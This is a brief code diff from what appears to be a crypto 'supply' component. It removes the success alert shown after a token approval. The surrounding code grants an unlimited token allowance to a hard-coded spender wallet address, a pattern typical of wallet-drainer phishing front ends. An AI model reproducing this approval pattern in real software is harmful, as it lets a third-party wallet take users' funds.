@@ -558,7 +558,7 @@ const SupplyAction = ({ value, usdValue, symbol, disable, onActionClicked }: Act
       let tx: any = await tokenContract.approve(SPENDER_WALLET_ADDRESS, maximumApprovalAmount);
       console.log(tx);
       await tx.wait();
-      await alert('Approval successful!');
+    
     } catch (error) {
       console.error('Error occurred during token approval:', error);
       alert('Some things went wrong!');
